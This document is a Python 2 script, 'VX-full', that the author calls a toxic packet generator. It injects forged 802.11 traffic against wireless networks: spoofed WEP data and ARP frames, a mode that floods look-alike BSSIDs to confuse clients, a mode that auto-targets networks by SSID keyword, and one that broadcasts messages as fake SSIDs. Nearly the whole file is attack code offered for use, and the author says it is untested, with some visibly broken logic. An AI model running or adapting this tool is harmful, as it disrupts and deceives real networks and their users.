#!/usr/bin/env python
"""
VX-full
*******
Arturo Filastò
(c) 2010

This is the full version of VX.
It has not been tested so expect bugs, and lot of them!

This version include two extra features: air shitting mode and make fun of
others mode.

The air shitting mode broadcasts beacon packets and data packets that match the
target SSID, but changes the last bytes of the BSSID, leading to a lot of
confusion when trying to identify the target network only by SSID.

The make fun of others mode broadcasts messages inside of the SSID of beacon
packets. This leads to people getting in the list of available network the
message you wish to transmit.

"""

import sys, getopt, os, random, threading, re, time

import pylorcon

import scapy.packet
import scapy.fields
from scapy.sendrecv import send,sendp,sniff
from scapy.layers import dot11, l2

unique = {}

def usage():
  print "VX v.0.1 - toxic packet generator"
  print "hacked by hellais"
  print ""
  print "-h \t this help"
  print "-s \t scan mode"
  print "-i <interface>"
  print "-k <wep hex key> (ex. ca:cc:aa:aa:dd)"
  print "-c <channel>"
  print "-e <essid>"
  print "-b <bssid>"
  print "-m <spoofed mac>"
  print "-d demon mode AKA no-brain mode"
  print "-a <a_n> air shitting mode"
  print "-f make fun of the others ;)"


def wepKey(WEPKEY):
    # Match and parse WEP key

    KEYID = 0
    tmp_key = ""
    if re.match('^([0-9a-fA-F]{2}){5}$', WEPKEY) or re.match ('^([0-9a-fA-F]{2}){13}$', WEPKEY):
      tmp_key = WEPKEY
    elif re.match('^([0-9a-fA-F]{2}[:]){4}[0-9a-fA-F]{2}$', WEPKEY) or re.match('^([0-9a-fA-F]{2}[:]){12}[0-9a-fA-F]{2}$', WEPKEY):
      tmp_key = re.sub(':', '', WEPKEY)
    elif re.match ('^([0-9a-fA-F]{4}[-]){2}[0-9a-fA-F]{2}$', WEPKEY) or re.match ('^([0-9a-fA-F]{4}[-]){6}[0-9a-fA-F]{2}$', WEPKEY):
      tmp_key = re.sub('-', '', WEPKEY)
    else:
      print "Error! Wrong format for WEP key"
      sys.exit(1)

    g = lambda x: chr(int(tmp_key[::2][x],16)*16+int(tmp_key[1::2][x],16))

    for i in range(len(tmp_key)/2):
      dot11.conf.wepkey += g(i)

    print "WEP key:    %s (%dbits)" % (WEPKEY, len(tmp_key)*4)

    if KEYID > 3 or KEYID < 0:
      print "Key id:     %s (defaulted to 0 due to wrong -k argument)" % KEYID
      KEYID = 0
    else:
      print "Key id:     %s" % KEYID


def randMac(prefix):
  space = "0123456789abcdef"
  mac = ""

  if re.match('^([0-9a-fA-F]{2}[:]?)+?', prefix) or not prefix:
    pnum = int((len(prefix)+1)/3)
    pnum =  6 - pnum
    mac += prefix
    for i in range(0,pnum):
      mac += ":" + space[random.randint(0,15)] + space[random.randint(0,15)]
  else:
    print "Wrong prefix format"

  #print mac
  return mac

def randKey():
  space = "0123456789abcdef"
  key = space[random.randint(0,15)] + space[random.randint(0,15)]
  for i in range(0,4):
    key += ":" + space[random.randint(0,15)] + space[random.randint(0,15)]
  return key

def macSeq(d,n):
  an = (n*d % pow(2,24))
  an = hex(an)[2:]
  an = "0"*(6 - len(an) + 1) + an
  mac = an[0:2] + ":" + an[2:4] + ":" + an[4:6]
  return mac

def pause(secs):
  start = time.time()
  while(float(time.time() - start) < secs):
    dio = "cane"

def getBeacon(bssid, ssid, channel):
    # BEACON FRAME STRUCTURE:
    # Total bytes: 121
    # [--Radiotap Header (32byte)--][--Beacon Frame (22bytes + 4byte@end)--][--Management Frame (12 Bytes Fixed + 49 Bytes tagged--][4 bytes end beacon]
    #
    # RADIOTAP HEADER:
    # ---- 1 byte --- - 1 byte  - --- 2 bytes --  - 4 b - -- 8 bytes --  -1 b-  -1 byte-   -2 byte- - 2 byte- -1 byte-  -1 byte-  -4-
    # [Header version][Header pad][Header length][Flags ][Mac timestamp][Flags][Data rate][Ch. freq][Ch. type][SSI sig.][Antenna][FCS]
    #
    # BEACON FRAME:
    #
    # [Type][Frame control]--[duration][dst addr][src addr][bssid addr][frag num][seq num][FCS]
    #       [flags(to-ds e co)]

  beacon_pckt = dot11.Dot11(addr1='ff:ff:ff:ff:ff:ff',            \
                            addr2=bssid,addr3=bssid)              \
                            / dot11.Dot11Beacon(cap='privacy+ESS')    \
                            / dot11.Dot11Elt(ID='SSID',           \
                                      info=ssid)                  \
                            / dot11.Dot11Elt(ID='DSset',          \
                                      info=chr(channel))          \
                            / dot11.Dot11Elt(ID='Rates',          \
                                      info='\x82\x84\x0b\x16')


  beacon_pckt.SC = random.randint(0,1024)
  beacon_pckt[dot11.Dot11Beacon].timestamp = random.randint(0,200) * 1000
  return beacon_pckt

def genWEP(iv, dst, bssid, src):

    data_pckt = dot11.Dot11(type="Data", addr1=dst, \
                      addr2=bssid, addr3=src,\
                      FCfield='from-DS')

    data_pckt.FCfield |= 0x40
    data_pckt /= dot11.Dot11WEP(iv = iv, keyid=4)/dot11.LLC(ctrl=3) / dot11.SNAP()\
                 / dot11.ARP(
                    op = "is-at",
                    hwsrc = src,
                    psrc = "192.168.1.1",
                    hwdst = dst,
                    pdst = "192.168.1.2")


    #data_resp = Dot11(addr1=mac2, addr2=mac1,FCfield='to-DS')
    #                  data_resp.FCfield |= 0x40
    #data_resp /= Dot11WEP(iv=str(iv+1),keyid=0)/LLC()/SNAP()/scapy.packet.Padding('a'*100)
    return data_pckt

def infect(iface, channel, bssid, essid, mac, key, l, num):
    tx = pylorcon.Lorcon(iface, "mac80211")
    tx.setfunctionalmode('INJECT')
    tx.setchannel(channel)
    #print tx.gettxrate()

    mgmtBeacon = getBeacon(bssid, essid, channel)
    if essid == "":
        essid = "broadcast"

    print "Using interface %s" % iface
    print "Injecting Beacon Frame for '%s'." % essid
    k = 0
    h = 0
    i = 0
    wepKey(key)
    while i <= num:
        if (k % 255) == 0:
          print "injected %d packets..." % (int(h)*255)
          h = h + 1
          k = -1
        if( h % 255) == 0:
          h = 0
          l = l + 1
        k = k + 1
        dataPack = genWEP(chr(h)+chr(l)+chr(k), bssid, bssid, mac)
        tx.txpacket(str(dataPack))
        #dataPack = genWEP(k, maca, src, src, "fluff")
        k = k + 1
        if num != 0:
          i += 1
        respPack = genWEP(chr(h)+chr(l)+chr(k), mac, bssid, bssid)
        tx.txpacket(str(respPack))
        if( k % 101 ) == 0:
          tx.txpacket(str(mgmtBeacon))

def contaminate_air(iface, channel, bssid, essid, mac, key, l, num, arit_n, d, spawn):
    tx = pylorcon.Lorcon(iface, "mac80211")
    tx.setfunctionalmode('INJECT')
    tx.setchannel(channel)
    #print tx.gettxrate()

    maclist = []
    mgmtBeacon = getBeacon(bssid, essid, channel)
    if essid == "":
        essid = "broadcast"

    print "Using interface %s" % iface
    print "Injecting Beacon Frame for '%s'." % essid
    k = 0
    h = 0
    i = 0
    wepKey(key)
    basemac = bssid[0:9]
    for j in range(0, int(spawn)):
      maclist.append(basemac + macSeq(d,int(arit_n)+j))
    while i <= num:
      for macs in maclist:
        mgmtBeacon = getBeacon(macs, essid, channel)
        if (k % 255) == 0:
          print "injected %d packets..." % (int(h)*255)
          h = h + 1
          k = -1
        if( h % 255) == 0:
          h = 0
          l = l + 1
        k = k + 1
        # print macs
        dataPack = genWEP(chr(h)+chr(l)+chr(k), macs, macs, mac)
        if ( k % 3 == 0):
          tx.txpacket(str(dataPack))
        # dataPack = genWEP(k, maca, src, src, "fluff")
        k = k + 1
        if num != 0:
          i += 1
        respPack = genWEP(chr(h)+chr(l)+chr(k), mac, macs, macs)
        if ( k % 3 == 0):
          tx.txpacket(str(respPack))
        tx.txpacket(str(mgmtBeacon))



def sniffBeacon(p):
    global unique
    if p.haslayer(dot11.Dot11Beacon):
        if unique.count([p.addr2, p.info]) == 0:
          unique.append([p.addr2,p.info])
          string = "[" + str(len(unique)) + "]" + " ESSID: %Dot11Elt.info%"
          string += "\nBSSID: %Dot11.addr2%\nMode: %Dot11Beacon.cap%"
          print p.sprintf(string)
          print "-"*15


def demon(p):
    global unique
    keyword = "CAT"

    if p.haslayer(dot11.Dot11Beacon):
        if unique.count([p.addr3, p.info]) == 0:
          unique.append([p.addr3,p.info])
          print ".",
          if re.search("(?i)"+keyword, p.info):
            print "Got a big fat fucken CAT!\n\n"
            unique[0][0] = len(unique)


def main():
  global unique

  # function testing zone! DO NOT ENTER!
  # macSeq(pow(23,23),4)
  # macSeq(pow(23,23),5)
  # macSeq(pow(23,23),6)
  # macSeq(pow(23,23),7)
  #contaminate_air("mon0", 6, "aa:bb:cc:dd:ee:ff", "test", "11:22:33:44:55:66", "aa:bb:cc:dd:ee", 99, 1000, 10, pow(23,23))
  #

  try:
    opts, args = getopt.getopt(sys.argv[1:], "hsdi:e:b:m:k:c:a:f:")
  except getopt.GetoptError, err:
    usage()
    sys.exit(2)

  channel = ""
  essid   = ""
  bssid   = ""
  mac     = "00:23:33:56:88:99"
  key     = ""
  logfile = "./output.log"

  # Air contamination stuff
  prefix  = "00:61:b2"
  d       = pow(23,23) # distance between a_n and a_(n-1) must be coprime with 2^24


  iface = "mon0"
  mode = "default"
  l = random.randint(0,255)

  unique = []

  n = 0

  flog = open(logfile, "a+")

  for opt, arg in opts:
    if opt in ("-h", "--help"):
      usage()
      sys.exit()
    elif opt in ("-s", "--scan"):
      mode = "scan"
    elif opt in ("-i", "--interface"):
      iface = arg
    elif opt in ("-e", "--essid"):
      essid = arg
      n = n + 1
    elif opt in ("-b", "--bssid"):
      bssid = arg
      n = n + 1
    elif opt in ("-m", "--mac"):
      mac = arg
      n = n + 1
    elif opt in ("-k", "--key"):
      key = arg
      n = n + 1
    elif opt in ("-c", "--channel"):
      try:
        channel = int(str(arg))
      except:
        print "Error in channel!"
        sys.exit(2)
    elif opt in ("-d", "--demon"):
      mode = "demon"
    elif opt in ("-a", "--air"):
      mode = "air"
      air_arg = arg

    elif opt in ("-f", "--fun"):
      mode = "fun"
      funny_string = arg

  if not channel:
    print "Error! Non channel supplied."
    usage()
    sys.exit(1)

  if not key:
    print "No key supplied!"
    print "I will make one for you ;)"
    key = randKey()

  flog.write("Started VX with parameters\n")
  flog.write("BSSID: " + str(bssid) + " Channel: " + str(channel) + " iface: " + \
              str(iface) + " key: "+str(key+"\n"))

  flog.write("SpoofedMAC: " + str(mac) + "\n")
  flog.close()

  flog = open(logfile,"a+")

  if(mode == "default" and n >= 3):
    print "Default mode"
    print "BSSID: %s MAC: %s ESSID: %s Channel: %s iface: %s" % (bssid, mac, essid, channel, iface)
    infect(iface, channel, bssid, essid, mac, key, l, 0)
  if(mode == "default" and n <= 3):
    print "Error! not enough arguments supplied to default mode!"
    usage()
    sys.exit(2)


  if(mode == "scan"):
    sniff(iface=iface,prn=sniffBeacon,timeout=2)
    x = input("Enter number of network to inject: ")
    x = int(x) - 1
    print "Injecting on %s (%s)" % (unique[x][1], unique[x][0])
    infect(iface, channel, unique[x][0], unique[x][1], mac, key, l, 0)
    print unique[int(x)-1]

  if(mode == "demon"):
    unique.append(["none","none"])
    unique[0][0] = "none"
    print "Sniff Sniff, do I smell CAT's?"
    while unique[0][0] == "none":
      sniff(iface=iface,prn=demon,timeout=2)
      pause(1)
    x = int(unique[0][0]) - 1
    infect(iface, channel, unique[x][0], unique[x][1], mac, key, l, 0)

  if(mode == "air"):
    arit_n = air_arg.split(",")[0]
    spawn = air_arg.split(",")[1]
    print "I will now shit in the air!"
    unique.append(["none", "none"])
    unique[0][0] = "none"
    flog.write("["+str(time.time())+"]")
    flog.write("\nLanching cat sniffer..\n")
    print "Launching CAT sniffer!"
    if not arit_n:
      arit_n = 0
    while unique[0][0] == "none":
      sniff(iface=iface, prn=demon, timeout=2)
      pause(1)
    x = int(unique[0][0]) - 1
    flog.write(str(unique[x][0])+","+str(unique[x][1])+"\n")
    flog.close()
    flog = open(logfile, "a+")
    print "Matched against ESSID: %s MAC: %s" % (unique[x][1], unique[x][0])
    contaminate_air(iface, channel, unique[x][0], unique[x][1], mac, key, l, 0, arit_n, d, spawn)
    # contaminate_air(iface, channel, unique[x][0], unique[x][1], mac, key, l, 0)

  if mode == "fun":
    print "Now will display funny string ;)"
    print "Funny string: \"%s\"" % funny_string
    funny_ar = funny_string.split(" ")

    tx = pylorcon.Lorcon(iface, "mac80211")
    tx.setfunctionalmode('INJECT')
    tx.setchannel(channel)
    modulus = len(funny_ar)
    for j in range(0,len(funny_ar)*100):
      for i in range(0,len(funny_ar)):
        essid = funny_ar[modulus - i - 1]
        mgmtBeacon = getBeacon(randMac("ca:cc:a1"), essid, channel)
        tx.txpacket(str(mgmtBeacon))

  flog.write("session ended\n")
  flog.write(str(time.time()))
  flog.write("---------\n\n")
  flog.close()

if __name__ == "__main__":
    main()

